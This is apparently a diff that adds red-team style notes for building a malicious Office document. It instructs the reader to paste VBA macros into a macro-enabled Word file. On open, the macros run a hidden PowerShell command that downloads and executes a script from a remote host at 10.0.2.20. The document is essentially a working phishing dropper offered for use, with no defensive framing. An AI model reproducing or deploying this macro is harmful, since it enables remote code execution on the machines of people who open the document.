@@ -1,0 +1,23 @@
+Office:
+
+Enable Developor Ribbon
+
+Then copy paste the following code onto a Word Doc and save it as a Macro-Enabled Document (.docm)
+When the file is opened the PowerShell Code will be executed
+
+########################################################
+
+Sub Auto_Open()
+   Dim exec As String
+   Dim payload As String
+   exec = "powershell.exe -WindowStyle hidden -nologo -noprofile -c ""IEX ((New-Object Net.WebClient).DownloadString('http://10.0.2.20:8000/payload.ps1'))"""
+   Shell (exec)
+End Sub
+Sub AutoOpen()
+    Auto_Open
+End Sub
+Sub Workbook_Open()
+   Auto_Open
+End Sub
+
+########################################################
